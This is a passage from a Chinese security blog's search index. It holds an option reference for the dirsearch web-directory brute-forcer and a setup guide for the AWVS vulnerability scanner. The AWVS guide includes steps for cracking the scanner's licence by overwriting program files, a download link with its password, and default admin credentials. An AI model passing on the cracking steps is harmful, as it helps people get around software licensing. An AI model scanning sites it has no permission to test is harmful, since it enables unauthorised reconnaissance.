        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py [-u|--url] target [-e|--extensions] extensions [options] Options:</span><br></pre></td></tr></table></figure><h2 id="Mandatory-强制参数"><a href="#Mandatory-强制参数" class="headerlink" title="Mandatory(强制参数):"></a>Mandatory(强制参数):</h2><p><code>-l FILE</code>, <code>--url-list=FILE</code>  #扫描列表文件中所有的url</p><p><code>--stdin</code>           URL list from STDIN    –cidr=CIDR     Target CIDR</p><p><code>--raw=FILE</code>     File contains the raw request (use –scheme flag to set the scheme)</p><p><code>-e EXTENSIONS</code> <code>--extensions=EXTENSIONS</code>                          设置网站脚本类型，<code>php,asp,*</code></p><p><code>-X EXTENSIONS</code> <code>--exclude-extensions=EXTENSIONS</code>     排除以逗号分隔的扩展名列表 (Example: asp,jsp)</p><p><code>-f</code> <code>--force-extensions</code>     扩展字典里的每个词条</p><h2 id="Dictionary-Settings-字典设置"><a href="#Dictionary-Settings-字典设置" class="headerlink" title="Dictionary Settings(字典设置):"></a>Dictionary Settings(字典设置):</h2><p><code>-w WORDLIST</code> <code>--wordlists=WORDLIST</code>              <strong>设置字典（逗号分隔）</strong></p><p><code>--prefixes=PREFIXES</code>                             向所有条目添加自定义前缀（以逗号分隔）</p><p><code>--suffixes=SUFFIXES</code>                             向所有条目添加自定义后缀（以逗号分隔）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619059870602-150f6a26-7741-4ea2-a878-9e71c89c1eff.png" alt="img"></p><p><code>--remove-extensions</code>     #删除所有单词列表条目中的扩展名（例如：admin.php-&gt; admin）</p><p><code>-U</code> <code>--uppercase</code>          #Uppercase wordlist 大写</p><p><code>-L</code> <code>--lowercase</code>           # Lowercase wordlist 小写</p><p><code>-C</code> <code>--capital</code>               #Capital wordlist 首字母大写</p><h2 id="General-Settings-通用设置"><a href="#General-Settings-通用设置" class="headerlink" title="General Settings(通用设置):"></a>General Settings(通用设置):</h2><p><code>-r</code>  <code>--recursive   #Bruteforce recursively</code>    <strong># 递归扫描，跑出目录后，继续跑目录下面的目录</strong></p><p><code>-R DEPTH</code> <code>--recursion-depth=DEPTH</code>        <strong># 设置最大递归深度</strong></p><p><code>-t THREADS</code> <code>--threads=THREADS</code>               <strong># 设置线程数量</strong>  </p><p><code>--subdirs=SUBDIRS</code>                         # 扫描指定URL的子目录（用逗号分隔）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619061483770-3314f9f3-3cdf-42aa-a926-a58cc0ef54eb.png" alt="img"></p><p><code>--exclude-subdirs=SUBDIRS</code>                         # 在递归扫描中，<strong>排除指定的子目录</strong> </p><p><code>-i STATUS</code> <code>--include-status=STATUS</code>         # 包含的状态码 (Example: 200,300-399)</p><p><code>-x STATUS</code> <code>--exclude-status=STATUS</code>     <strong># 排除的状态码 (Example: 301,500-599)</strong></p><p><code>--exclude-sizes=SIZES</code>                     # 排除异常响应 (Example: 123B,4KB)</p><p><code>--exclude-texts=TEXTS</code>                     # 排除文字响应(Example: ‘Not found’, ‘Error’)</p><p><code>--exclude-regexps=REGEXPS</code>          # 使用正则匹配排除的文字响应(Example: ‘Not foun[a-z]{1}’, ‘^Error$’)</p><p><code>--exclude-redirects=REGEXPS</code>     # 通过重定向正则表达式或文本排除响应，逗号隔开(Example: ‘<a href="https://okta.com/*&#39;">https://okta.com/*&#39;</a>)</p><p><code>--random-agent</code>           <strong># 为每个请求选择一个随机的User-Agent</strong></p><p><code>--skip-on-429</code>             # 返回429状态码时跳过目标</p><p><code>--full-url</code>                     # 返回完整url</p><h2 id="Request-Settings-请求设置"><a href="#Request-Settings-请求设置" class="headerlink" title="Request Settings(请求设置):"></a>Request Settings(请求设置):</h2><p><code>-m METHOD, --http-method=METHOD</code>     # HTTP请求方式(default: GET)</p><p><code>-d DATA, --data=DATA</code>                    # HTTP请求数据</p><p><code>-H HEADERS, --header=HEADERS</code># HTTP请求标头，支持多个标志 (Example: -H ‘Referer: example.com’ -H ‘Accept: <em>/</em>‘)</p><p><code>--header-list=FILE</code>                      # 文件包含HTTP请求标头</p><p><code>-F</code> <code>--follow-redirects</code>                     <strong># 跟随地址重定向扫描</strong></p><p><code>--user-agent=USERAGENT</code>                <strong>#设置用户代理</strong></p><p><code>--cookie=COOKIE</code>                        <strong>#设置cookie</strong></p><h2 id="Connection-Settings-连接设置"><a href="#Connection-Settings-连接设置" class="headerlink" title="Connection Settings(连接设置):"></a>Connection Settings(连接设置):</h2><p><code>--timeout=TIMEOUT</code>          # 设置超时时间</p><p><code>--ip=IP</code>                   # 设置代理IP</p><p><code>-s DELAY, --delay=DELAY</code>    <strong># 设置请求之间的延迟</strong></p><p><code>--proxy=PROXY</code>            # 代理URL，支持HTTP和SOCKS代理 (Example: localhost:8080, socks5://localhost:8088)</p><p><code>--proxy-list=FILE</code>              # File contains proxy servers</p><p><code>--replay-proxy=PROXY</code>         # Proxy to replay with found paths</p><p><code>--scheme=SCHEME</code>           # Default scheme (for raw request or if there is no scheme in the URL)</p><p><code>--max-retries=RETRIES</code>        # 设置最大重试次数</p><p><code>-b, --request-by-hostname</code>      # By default dirsearch requests by IP for speed. This will force requests by hostname</p><p><code>--exit-on-error</code>               # Exit whenever an error occurs</p><p><code>--debug</code>                   # Debug mode</p><h2 id="Reports-报告输出"><a href="#Reports-报告输出" class="headerlink" title="Reports(报告输出):"></a>Reports(报告输出):</h2><p><code>--simple-report=OUTPUTFILE</code></p><p><code>--plain-text-report=OUTPUTFILE</code></p><p><code>--json-report=OUTPUTFILE</code></p><p><code>--xml-report=OUTPUTFILE</code></p><p><code>--markdown-report=OUTPUTFILE</code></p><p><code>--csv-report=OUTPUTFILE</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619074696275-802dd0f3-5be5-4c03-abf2-27c845ac8b97.png" alt="img">             </p><p>可以通过修改<code>default.conf</code>文件修改默认配置，更多信息访问此链接</p><p>You can change the dirsearch default configurations (default extensions,timeout, wordlist location, …) by editing the “default.conf” file. More</p><p>information at <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>.</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWVS扫描器</title>
      <link href="/p/34660774.html"/>
      <url>/p/34660774.html</url>
      
        <content type="html"><![CDATA[<p>有的客户特别中意AWVS的扫描报告，简单记录下使用过程。</p><span id="more"></span><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><a href="https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD">https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD</a> (访问密码 : 4k21vo)</p><p>将<code>.zip</code>删除</p><p>下一步下一步安装即可。破解过程：</p><ol><li><code>wvsc.exe</code> 覆盖<code>C:\Program Files (x86)\Acunetix\13.0.200205121</code>目录下同名文件</li><li><code>license_info.json</code> 覆盖<code>C:\ProgramData\Acunetix\shared\license</code>目录下同名文件</li></ol><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#  pull 拉取下载镜像</span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">#  将容器的3443端口映射到宿主机的 13443端口</span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"># 开放端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 13443 -j ACCEPT</span><br></pre></td></tr></table></figure><p>链接地址<a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><h1 id="用户密码"><a href="#用户密码" class="headerlink" title="用户密码"></a>用户密码</h1><p><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin123@email.com</span><br><span class="line">Admin123</span><br><span class="line"># 最新拉取密码改为</span><br><span class="line">username: admin@admin.com  </span><br><span class="line">password: Admin123</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619578517298-4d1bd4bc-45b2-460c-933a-8649c4ab106a.png" alt="img"></p><h2 id="功能表"><a href="#功能表" class="headerlink" title="功能表"></a>功能表</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1600932667082-59ec876e-84dd-4a88-a688-849ed3ca3396.png" alt="img"></h2><ul><li><p><strong>Dashboard</strong>是仪表盘，你扫描过的网站的一些漏洞信息这里会显示</p></li><li><p><strong>Targets</strong>是目标网站，就是你要扫描的目标网站</p></li><li><p><strong>Vulnerabilities</strong>就是漏洞，网站的漏洞</p></li><li><p><strong>Scans</strong>就是扫描目标站点，从Target里面选择目标站点进行扫描</p></li><li><p><strong>Reports</strong>就是漏洞扫描完之后的报告</p></li></ul><h2 id="建立扫描"><a href="#建立扫描" class="headerlink" title="建立扫描"></a>建立扫描</h2><p>点击Targets–&gt;Add Target</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819201434815.png" alt="image-20210819201434815"></p><p>然后进入了下面这个页面，<strong>Scan Speed</strong>可以选择扫描的速度，速度越慢扫描的也越仔细。如果站点是需要登录的网站，这里就要勾选上<strong>Site Login</strong>，如果站点不需要登录的话，这里就不用勾选。这底下还有一个<strong>AcuSensor</strong>，总的来说就是允许扫描仪从PHP、ASP或JSP应用程序中收集更多信息，从而改进扫描结果并使其可靠性更高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
